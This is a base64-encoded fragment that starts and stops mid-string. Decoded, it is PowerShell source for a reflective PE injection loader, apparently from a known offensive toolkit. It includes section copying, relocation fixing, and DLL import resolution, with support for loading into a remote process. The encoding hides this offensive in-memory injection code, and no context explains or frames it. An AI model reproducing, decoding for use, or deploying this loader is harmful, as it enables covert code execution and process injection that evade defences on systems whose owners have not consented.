zJdJFNlY3Rpb25IZWFkZXIuUG9pbnRlclRvUmF3RGF0YSwgJFNlY3Rpb25EZXN0QWRkciwgJFNpemVPZlJhd0RhdGEpCiAgICAgICAgICAgIH0KICAgICAgICAKICAgICAgICAgICAgI0lmIFNpemVPZlJhd0RhdGEgaXMgbGVzcyB0aGFuIFZpcnR1YWxTaXplLCBzZXQgbWVtb3J5IHRvIDAgZm9yIHRoZSBleHRyYSBzcGFjZQogICAgICAgICAgICBpZiAoJFNlY3Rpb25IZWFkZXIuU2l6ZU9mUmF3RGF0YSAtbHQgJFNlY3Rpb25IZWFkZXIuVmlydHVhbFNpemUpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICREaWZmZXJlbmNlID0gJFNlY3Rpb25IZWFkZXIuVmlydHVhbFNpemUgLSAkU2l6ZU9mUmF3RGF0YQogICAgICAgICAgICAgICAgW0ludFB0cl0kU3RhcnRBZGRyZXNzID0gW0ludFB0cl0oQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKFtJbnQ2NF0kU2VjdGlvbkRlc3RBZGRyKSAoW0ludDY0XSRTaXplT2ZSYXdEYXRhKSkKICAgICAgICAgICAgICAgIFRlc3QtTWVtb3J5UmFuZ2VWYWxpZCAtRGVidWdTdHJpbmcgIkNvcHktU2VjdGlvbnM6Ok1lbXNldCIgLVBFSW5mbyAkUEVJbmZvIC1TdGFydEFkZHJlc3MgJFN0YXJ0QWRkcmVzcyAtU2l6ZSAkRGlmZmVyZW5jZSB8IE91dC1OdWxsCiAgICAgICAgICAgICAgICAkV2luMzJGdW5jdGlvbnMubWVtc2V0Lkludm9rZSgkU3RhcnRBZGRyZXNzLCAwLCBbSW50UHRyXSREaWZmZXJlbmNlKSB8IE91dC1OdWxsCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CgoKICAgIEZ1bmN0aW9uIFVwZGF0ZS1NZW1vcnlBZGRyZXNzZXMKICAgIHsKICAgICAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtTeXN0ZW0uT2JqZWN0XQogICAgICAgICRQRUluZm8sCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbSW50NjRdCiAgICAgICAgJE9yaWdpbmFsSW1hZ2VCYXNlLAogICAgICAgIAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAyLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW1N5c3RlbS5PYmplY3RdCiAgICAgICAgJFdpbjMyQ29uc3RhbnRzLAogICAgICAgIAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAzLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW1N5c3RlbS5PYmplY3RdCiAgICAgICAgJFdpbjMyVHlwZXMKICAgICAgICApCiAgICAgICAgCiAgICAgICAgW0ludDY0XSRCYXNlRGlmZmVyZW5jZSA9IDAKICAgICAgICAkQWRkRGlmZmVyZW5jZSA9ICR0cnVlICNUcmFjayBpZiB0aGUgZGlmZmVyZW5jZSB2YXJpYWJsZSBzaG91bGQgYmUgYWRkZWQgb3Igc3VidHJhY3RlZCBmcm9tIHZhcmlhYmxlcwogICAgICAgIFtVSW50MzJdJEltYWdlQmFzZVJlbG9jU2l6ZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZihbVHlwZV0kV2luMzJUeXBlcy5JTUFHRV9CQVNFX1JFTE9DQVRJT04pCiAgICAgICAgCiAgICAgICAgI0lmIHRoZSBQRSB3YXMgbG9hZGVkIHRvIGl0cyBleHBlY3RlZCBhZGRyZXNzIG9yIHRoZXJlIGFyZSBubyBlbnRyaWVzIGluIHRoZSBCYXNlUmVsb2NhdGlvblRhYmxlLCBub3RoaW5nIHRvIGRvCiAgICAgICAgaWYgKCgkT3JpZ2luYWxJbWFnZUJhc2UgLWVxIFtJbnQ2NF0kUEVJbmZvLkVmZmVjdGl2ZVBFSGFuZGxlKSBgCiAgICAgICAgICAgICAgICAtb3IgKCRQRUluZm8uSU1BR0VfTlRfSEVBREVSUy5PcHRpb25hbEhlYWRlci5CYXNlUmVsb2NhdGlvblRhYmxlLlNpemUgLWVxIDApKQogICAgICAgIHsKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgfQoKCiAgICAgICAgZWxzZWlmICgoQ29tcGFyZS1WYWwxR3JlYXRlclRoYW5WYWwyQXNVSW50ICgkT3JpZ2luYWxJbWFnZUJhc2UpICgkUEVJbmZvLkVmZmVjdGl2ZVBFSGFuZGxlKSkgLWVxICR0cnVlKQogICAgICAgIHsKICAgICAgICAgICAgJEJhc2VEaWZmZXJlbmNlID0gU3ViLVNpZ25lZEludEFzVW5zaWduZWQgKCRPcmlnaW5hbEltYWdlQmFzZSkgKCRQRUluZm8uRWZmZWN0aXZlUEVIYW5kbGUpCiAgICAgICAgICAgICRBZGREaWZmZXJlbmNlID0gJGZhbHNlCiAgICAgICAgfQogICAgICAgIGVsc2VpZiAoKENvbXBhcmUtVmFsMUdyZWF0ZXJUaGFuVmFsMkFzVUludCAoJFBFSW5mby5FZmZlY3RpdmVQRUhhbmRsZSkgKCRPcmlnaW5hbEltYWdlQmFzZSkpIC1lcSAkdHJ1ZSkKICAgICAgICB7CiAgICAgICAgICAgICRCYXNlRGlmZmVyZW5jZSA9IFN1Yi1TaWduZWRJbnRBc1Vuc2lnbmVkICgkUEVJbmZvLkVmZmVjdGl2ZVBFSGFuZGxlKSAoJE9yaWdpbmFsSW1hZ2VCYXNlKQogICAgICAgIH0KICAgICAgICAKICAgICAgICAjVXNlIHRoZSBJTUFHRV9CQVNFX1JFTE9DQVRJT04gc3RydWN0dXJlIHRvIGZpbmQgbWVtb3J5IGFkZHJlc3NlcyB3aGljaCBuZWVkIHRvIGJlIG1vZGlmaWVkCiAgICAgICAgW0ludFB0cl0kQmFzZVJlbG9jUHRyID0gW0ludFB0cl0oQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKFtJbnQ2NF0kUEVJbmZvLlBFSGFuZGxlKSAoW0ludDY0XSRQRUluZm8uSU1BR0VfTlRfSEVBREVSUy5PcHRpb25hbEhlYWRlci5CYXNlUmVsb2NhdGlvblRhYmxlLlZpcnR1YWxBZGRyZXNzKSkKICAgICAgICB3aGlsZSgkdHJ1ZSkKICAgICAgICB7CiAgICAgICAgICAgICNJZiBTaXplT2ZCbG9jayA9PSAwLCB3ZSBhcmUgZG9uZQogICAgICAgICAgICAkQmFzZVJlbG9jYXRpb25UYWJsZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RydWN0dXJlKCRCYXNlUmVsb2NQdHIsIFtUeXBlXSRXaW4zMlR5cGVzLklNQUdFX0JBU0VfUkVMT0NBVElPTikKCiAgICAgICAgICAgIGlmICgkQmFzZVJlbG9jYXRpb25UYWJsZS5TaXplT2ZCbG9jayAtZXEgMCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgW0ludFB0cl0kTWVtQWRkckJhc2UgPSBbSW50UHRyXShBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoW0ludDY0XSRQRUluZm8uUEVIYW5kbGUpIChbSW50NjRdJEJhc2VSZWxvY2F0aW9uVGFibGUuVmlydHVhbEFkZHJlc3MpKQogICAgICAgICAgICAkTnVtUmVsb2NhdGlvbnMgPSAoJEJhc2VSZWxvY2F0aW9uVGFibGUuU2l6ZU9mQmxvY2sgLSAkSW1hZ2VCYXNlUmVsb2NTaXplKSAvIDIKCiAgICAgICAgICAgICNMb29wIHRocm91Z2ggZWFjaCByZWxvY2F0aW9uCiAgICAgICAgICAgIGZvcigkaSA9IDA7ICRpIC1sdCAkTnVtUmVsb2NhdGlvbnM7ICRpKyspCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICNHZXQgaW5mbyBmb3IgdGhpcyByZWxvY2F0aW9uCiAgICAgICAgICAgICAgICAkUmVsb2NhdGlvbkluZm9QdHIgPSBbSW50UHRyXShBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoW0ludFB0cl0kQmFzZVJlbG9jUHRyKSAoW0ludDY0XSRJbWFnZUJhc2VSZWxvY1NpemUgKyAoMiAqICRpKSkpCiAgICAgICAgICAgICAgICBbVUludDE2XSRSZWxvY2F0aW9uSW5mbyA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RydWN0dXJlKCRSZWxvY2F0aW9uSW5mb1B0ciwgW1R5cGVdW1VJbnQxNl0pCgogICAgICAgICAgICAgICAgI0ZpcnN0IDQgYml0cyBpcyB0aGUgcmVsb2NhdGlvbiB0eXBlLCBsYXN0IDEyIGJpdHMgaXMgdGhlIGFkZHJlc3Mgb2Zmc2V0IGZyb20gJE1lbUFkZHJCYXNlCiAgICAgICAgICAgICAgICBbVUludDE2XSRSZWxvY09mZnNldCA9ICRSZWxvY2F0aW9uSW5mbyAtYmFuZCAweDBGRkYKICAgICAgICAgICAgICAgIFtVSW50MTZdJFJlbG9jVHlwZSA9ICRSZWxvY2F0aW9uSW5mbyAtYmFuZCAweEYwMDAKICAgICAgICAgICAgICAgIGZvciAoJGogPSAwOyAkaiAtbHQgMTI7ICRqKyspCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJFJlbG9jVHlwZSA9IFtNYXRoXTo6Rmxvb3IoJFJlbG9jVHlwZSAvIDIpCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgI0ZvciBETEwncyB0aGVyZSBhcmUgdHdvIHR5cGVzIG9mIHJlbG9jYXRpb25zIHVzZWQgYWNjb3JkaW5nIHRvIHRoZSBmb2xsb3dpbmcgTVNETiBhcnRpY2xlLiBPbmUgZm9yIDY0Yml0IGFuZCBvbmUgZm9yIDMyYml0LgogICAgICAgICAgICAgICAgI1RoaXMgYXBwZWFycyB0byBiZSB0cnVlIGZvciBFWEUncyBhcyB3ZWxsLgogICAgICAgICAgICAgICAgIyAgIFNpdGU6IGh0dHA6Ly9tc2RuLm1pY3Jvc29mdC5jb20vZW4tdXMvbWFnYXppbmUvY2MzMDE4MDguYXNweAogICAgICAgICAgICAgICAgaWYgKCgkUmVsb2NUeXBlIC1lcSAkV2luMzJDb25zdGFudHMuSU1BR0VfUkVMX0JBU0VEX0hJR0hMT1cpIGAKICAgICAgICAgICAgICAgICAgICAgICAgLW9yICgkUmVsb2NUeXBlIC1lcSAkV2luMzJDb25zdGFudHMuSU1BR0VfUkVMX0JBU0VEX0RJUjY0KSkKICAgICAgICAgICAgICAgIHsgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICNHZXQgdGhlIGN1cnJlbnQgbWVtb3J5IGFkZHJlc3MgYW5kIHVwZGF0ZSBpdCBiYXNlZCBvZmYgdGhlIGRpZmZlcmVuY2UgYmV0d2VlbiBQRSBleHBlY3RlZCBiYXNlIGFkZHJlc3MgYW5kIGFjdHVhbCBiYXNlIGFkZHJlc3MKICAgICAgICAgICAgICAgICAgICBbSW50UHRyXSRGaW5hbEFkZHIgPSBbSW50UHRyXShBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoW0ludDY0XSRNZW1BZGRyQmFzZSkgKFtJbnQ2NF0kUmVsb2NPZmZzZXQpKQogICAgICAgICAgICAgICAgICAgIFtJbnRQdHJdJEN1cnJBZGRyID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJEZpbmFsQWRkciwgW1R5cGVdW0ludFB0cl0pCiAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgaWYgKCRBZGREaWZmZXJlbmNlIC1lcSAkdHJ1ZSkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIFtJbnRQdHJdJEN1cnJBZGRyID0gW0ludFB0cl0oQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKFtJbnQ2NF0kQ3VyckFkZHIpICgkQmFzZURpZmZlcmVuY2UpKQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBbSW50UHRyXSRDdXJyQWRkciA9IFtJbnRQdHJdKFN1Yi1TaWduZWRJbnRBc1Vuc2lnbmVkIChbSW50NjRdJEN1cnJBZGRyKSAoJEJhc2VEaWZmZXJlbmNlKSkKICAgICAgICAgICAgICAgICAgICB9ICAgICAgICAgICAgICAgCgogICAgICAgICAgICAgICAgICAgIFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlN0cnVjdHVyZVRvUHRyKCRDdXJyQWRkciwgJEZpbmFsQWRkciwgJGZhbHNlKSB8IE91dC1OdWxsCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlaWYgKCRSZWxvY1R5cGUgLW5lICRXaW4zMkNvbnN0YW50cy5JTUFHRV9SRUxfQkFTRURfQUJTT0xVVEUpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgI0lNQUdFX1JFTF9CQVNFRF9BQlNPTFVURSBpcyBqdXN0IHVzZWQgZm9yIHBhZGRpbmcsIHdlIGRvbid0IGFjdHVhbGx5IGRvIGFueXRoaW5nIHdpdGggaXQKICAgICAgICAgICAgICAgICAgICBUaHJvdyAiVW5rbm93biByZWxvY2F0aW9uIGZvdW5kLCByZWxvY2F0aW9uIHZhbHVlOiAkUmVsb2NUeXBlLCByZWxvY2F0aW9uaW5mbzogJFJlbG9jYXRpb25JbmZvIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICAkQmFzZVJlbG9jUHRyID0gW0ludFB0cl0oQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKFtJbnQ2NF0kQmFzZVJlbG9jUHRyKSAoW0ludDY0XSRCYXNlUmVsb2NhdGlvblRhYmxlLlNpemVPZkJsb2NrKSkKICAgICAgICB9CiAgICB9CgoKICAgIEZ1bmN0aW9uIEltcG9ydC1EbGxJbXBvcnRzCiAgICB7CiAgICAgICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbU3lzdGVtLk9iamVjdF0KICAgICAgICAkUEVJbmZvLAogICAgICAgIAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW1N5c3RlbS5PYmplY3RdCiAgICAgICAgJFdpbjMyRnVuY3Rpb25zLAogICAgICAgIAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAyLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW1N5c3RlbS5PYmplY3RdCiAgICAgICAgJFdpbjMyVHlwZXMsCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDMsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbU3lzdGVtLk9iamVjdF0KICAgICAgICAkV2luMzJDb25zdGFudHMsCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDQsIE1hbmRhdG9yeSA9ICRmYWxzZSldCiAgICAgICAgW0ludFB0cl0KICAgICAgICAkUmVtb3RlUHJvY0hhbmRsZQogICAgICAgICkKICAgICAgICAKICAgICAgICAkUmVtb3RlTG9hZGluZyA9ICRmYWxzZQogICAgICAgIGlmICgkUEVJbmZvLlBFSGFuZGxlIC1uZSAkUEVJbmZvLkVmZmVjdGl2ZVBFSGFuZGxlKQogICAgICAgIHsKICAgICAgICAgICAgJFJlbW90ZUxvYWRpbmcgPSAkdHJ1ZQogICAgICAgIH0KICAgICAgICAKICAgICAgICBpZiAoJFBFSW5mby5JTUFHRV9OVF9IRUFERVJTLk9wdGlvbmFsSGVhZGVyLkltcG9ydFRhYmxlLlNpemUgLWd0IDApCiAgICAgICAgewogICAgICAgICAgICBbSW50UHRyXSRJbXBvcnREZXNjcmlwdG9yUHRyID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKFtJbnQ2NF0kUEVJbmZvLlBFSGFuZGxlKSAoW0ludDY0XSRQRUluZm8uSU1BR0VfTlRfSEVBREVSUy5PcHRpb25hbEhlYWRlci5JbXBvcnRUYWJsZS5WaXJ0dWFsQWRkcmVzcykKICAgICAgICAgICAgCiAgICAgICAgICAgIHdoaWxlICgkdHJ1ZSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJEltcG9ydERlc2NyaXB0b3IgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cnVjdHVyZSgkSW1wb3J0RGVzY3JpcHRvclB0ciwgW1R5cGVdJFdpbjMyVHlwZXMuSU1BR0VfSU1QT1JUX0RFU0NSSVBUT1IpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICNJZiB0aGUgc3RydWN0dXJlIGlzIG51bGwsIGl0IHNpZ25hbHMgdGhhdCB0aGlzIGlzIHRoZSBlbmQgb2YgdGhlIGFycmF5CiAgICAgICAgICAgICAgICBpZiAoJEltcG9ydERlc2NyaXB0b3IuQ2hhcmFjdGVyaXN0aWNzIC1lcSAwIGAKICAgICAgICAgICAgICAgICAgICAgICAgLWFuZCAkSW1wb3J0RGVzY3JpcHRvci5GaXJzdFRodW5rIC1lcSAwIGAKICAgICAgICAgICAgICAgICAgICAgICAgLWFuZCAkSW1wb3J0RGVzY3JpcHRvci5Gb3J3YXJkZXJDaGFpbiAtZXEgMCBgCiAgICAgICAgICAgICAgICAgICAgICAgIC1hbmQgJEltcG9ydERlc2NyaXB0b3IuTmFtZSAtZXEgMCBgCiAgICAgICAgICAgICAgICAgICAgICAgIC1hbmQgJEltcG9ydERlc2NyaXB0b3IuVGltZURhdGVTdGFtcCAtZXEgMCkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJEb25lIGltcG9ydGluZyBETEwgaW1wb3J0cyIKICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICRJbXBvcnREbGxIYW5kbGUgPSBbSW50UHRyXTo6WmVybwogICAgICAgICAgICAgICAgJEltcG9ydERsbFBhdGhQdHIgPSAoQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKFtJbnQ2NF0kUEVJbmZvLlBFSGFuZGxlKSAoW0ludDY0XSRJbXBvcnREZXNjcmlwdG9yLk5hbWUpKQogICAgICAgICAgICAgICAgJEltcG9ydERsbFBhdGggPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cmluZ0Fuc2koJEltcG9ydERsbFBhdGhQdHIpCiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJJbXBvcnRpbmcgJEltcG9ydERsbFBhdGgiCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGlmICgkUmVtb3RlTG9hZGluZyAtZXEgJHRydWUpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJEltcG9ydERsbEhhbmRsZSA9IEltcG9ydC1EbGxJblJlbW90ZVByb2Nlc3MgLVJlbW90ZVByb2NIYW5kbGUgJFJlbW90ZVByb2NIYW5kbGUgLUltcG9ydERsbFBhdGhQdHIgJEltcG9ydERsbFBhdGhQdHIKICAgICAgICAgICAgICAgICAgICAjV3JpdGUtVmVyYm9zZSAiSW1wb3J0ZWQgJEltcG9ydERsbFBhdGggdG8gcmVtb3RlIHByb2Nlc3MiCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJEltcG9ydERsbEhhbmRsZSA9ICRXaW4zMkZ1bmN0aW9ucy5Mb2FkTGlicmFyeS5JbnZva2UoJEltcG9ydERsbFBhdGgpCiAgICAgICAgICAgICAgICAgICAgI1dyaXRlLVZlcmJvc2UgIkltcG9ydGVkICRJbXBvcnREbGxQYXRoIgogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGlmICgoJEltcG9ydERsbEhhbmRsZSAtZXEgJG51bGwpIC1vciAoJEltcG9ydERsbEhhbmRsZSAtZXEgW0ludFB0cl06Olplcm8pKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIHRocm93ICJFcnJvciBpbXBvcnRpbmcgRExMLCBETExOYW1lOiAkSW1wb3J0RGxsUGF0aCIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgI0dldCB0aGUgZmlyc3QgdGh1bmssIHRoZW4gbG9vcCB0aHJvdWdoIGFsbCBvZiB0aGVtCiAgICAgICAgICAgICAgICBbSW50UHRyXSRUaHVua1JlZiA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICgkUEVJbmZvLlBFSGFuZGxlKSAoJEltcG9ydERlc2NyaXB0b3IuRmlyc3RUaHVuaykKICAgICAgICAgICAgICAgIFtJbnRQdHJdJE9yaWdpbmFsVGh1bmtSZWYgPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoJFBFSW5mby5QRUhhbmRsZSkgKCRJbXBvcnREZXNjcmlwdG9yLkNoYXJhY3RlcmlzdGljcykgI0NoYXJhY3RlcmlzdGljcyBpcyBvdmVybG9hZGVkIHdpdGggT3JpZ2luYWxGaXJzdFRodW5rCiAgICAgICAgICAgICAgICBbSW50UHRyXSRPcmlnaW5hbFRodW5rUmVmVmFsID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJE9yaWdpbmFsVGh1bmtSZWYsIFtUeXBlXVtJbnRQdHJdKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB3aGlsZSAoJE9yaWdpbmFsVGh1bmtSZWZWYWwgLW5lIFtJbnRQdHJdOjpaZXJvKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRMb2FkQnlPcmRpbmFsID0gJGZhbHNlCiAgICAgICAgICAgICAgICAgICAgW0ludFB0cl0kUHJvY2VkdXJlTmFtZVB0ciA9IFtJbnRQdHJdOjpaZXJvCiAgICAgICAgICAgICAgICAgICAgI0NvbXBhcmUgdGh1bmtSZWZWYWwgdG8gSU1BR0VfT1JESU5BTF9GTEFHLCB3aGljaCBpcyBkZWZpbmVkIGFzIDB4ODAwMDAwMDAgb3IgMHg4MDAwMDAwMDAwMDAwMDAwIGRlcGVuZGluZyBvbiAzMmJpdCBvciA2NGJpdAogICAgICAgICAgICAgICAgICAgICMgICBJZiB0aGUgdG9wIGJpdCBpcyBzZXQgb24gYW4gaW50LCBpdCB3aWxsIGJlIG5lZ2F0aXZlLCBzbyBpbnN0ZWFkIG9mIHdvcnJ5aW5nIGFib3V0IGNhc3RpbmcgdGhpcyB0byB1aW50CiAgICAgICAgICAgICAgICAgICAgIyAgIGFuZCBkb2luZyB0aGUgY29tcGFyaXNvbiwganVzdCBzZWUgaWYgaXQgaXMgbGVzcyB0aGFuIDAKICAgICAgICAgICAgICAgICAgICBbSW50UHRyXSROZXdUaHVua1JlZiA9IFtJbnRQdHJdOjpaZXJvCiAgICAgICAgICAgICAgICAgICAgaWYoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKFtUeXBlXVtJbnRQdHJdKSAtZXEgNCAtYW5kIFtJbnQzMl0kT3JpZ2luYWxUaHVua1JlZlZhbCAtbHQgMCkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIFtJbnRQdHJdJFByb2NlZHVyZU5hbWVQdHIgPSBbSW50UHRyXSRPcmlnaW5hbFRodW5rUmVmVmFsIC1iYW5kIDB4ZmZmZiAjVGhpcyBpcyBhY3R1YWxseSBhIGxvb2t1cCBieSBvcmRpbmFsCiAgICAgICAgICAgICAgICAgICAgICAgICRMb2FkQnlPcmRpbmFsID0gJHRydWUKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZWlmKFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZihbVHlwZV1bSW50UHRyXSkgLWVxIDggLWFuZCBbSW50NjRdJE9yaWdpbmFsVGh1bmtSZWZWYWwgLWx0IDApCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBbSW50UHRyXSRQcm9jZWR1cmVOYW1lUHRyID0gW0ludDY0XSRPcmlnaW5hbFRodW5rUmVmVmFsIC1iYW5kIDB4ZmZmZiAjVGhpcyBpcyBhY3R1YWxseSBhIGxvb2t1cCBieSBvcmRpbmFsCiAgICAgICAgICAgICAgICAgICAgICAgICRMb2FkQnlPcmRpbmFsID0gJHRydWUKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgW0ludFB0cl0kU3RyaW5nQWRkciA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICgkUEVJbmZvLlBFSGFuZGxlKSAoJE9yaWdpbmFsVGh1bmtSZWZWYWwpCiAgICAgICAgICAgICAgICAgICAgICAgICRTdHJpbmdBZGRyID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgJFN0cmluZ0FkZHIgKFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZihbVHlwZV1bVUludDE2XSkpCiAgICAgICAgICAgICAgICAgICAgICAgICRQcm9jZWR1cmVOYW1lID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJpbmdBbnNpKCRTdHJpbmdBZGRyKQogICAgICAgICAgICAgICAgICAgICAgICAkUHJvY2VkdXJlTmFtZVB0ciA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlN0cmluZ1RvSEdsb2JhbEFuc2koJFByb2NlZHVyZU5hbWUpCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGlmICgkUmVtb3RlTG9hZGluZyAtZXEgJHRydWUpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBbSW50UHRyXSROZXdUaHVua1JlZiA9IEdldC1SZW1vdGVQcm9jQWRkcmVzcyAtUmVtb3RlUHJvY0hhbmRsZSAkUmVtb3RlUHJvY0hhbmRsZSAtUmVtb3RlRGxsSGFuZGxlICRJbXBvcnREbGxIYW5kbGUgLUZ1bmN0aW9uTmFtZVB0ciAkUHJvY2VkdXJlTmFtZVB0ciAtTG9hZEJ5T3JkaW5hbCAkTG9hZEJ5T3JkaW5hbAogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgW0ludFB0cl0kTmV3VGh1bmtSZWYgPSAkV2luMzJGdW5jdGlvbnMuR2V0UHJvY0FkZHJlc3NJbnRQdHIuSW52b2tlKCRJbXBvcnREbGxIYW5kbGUsICRQcm9jZWR1cmVOYW1lUHRyKQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBpZiAoJE5ld1RodW5rUmVmIC1lcSAkbnVsbCAtb3IgJE5ld1RodW5rUmVmIC1lcSBbSW50UHRyXTo6WmVybykKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkTG9hZEJ5T3JkaW5hbCkKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgVGhyb3cgIk5ldyBmdW5jdGlvbiByZWZlcmVuY2UgaXMgbnVsbCwgdGhpcyBpcyBhbG1vc3QgY2VydGFpbmx5IGEgYnVnIGluIHRoaXMgc2NyaXB0LiBGdW5jdGlvbiBPcmRpbmFsOiAkUHJvY2VkdXJlTmFtZVB0ci4gRGxsOiAkSW1wb3J0RGxsUGF0aCIKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRocm93ICJOZXcgZnVuY3Rpb24gcmVmZXJlbmNlIGlzIG51bGwsIHRoaXMgaXMgYWxtb3N0IGNlcnRhaW5seSBhIGJ1ZyBpbiB0aGlzIHNjcmlwdC4gRnVuY3Rpb246ICRQcm9jZWR1cmVOYW1lLiBEbGw6ICRJbXBvcnREbGxQYXRoIgogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAg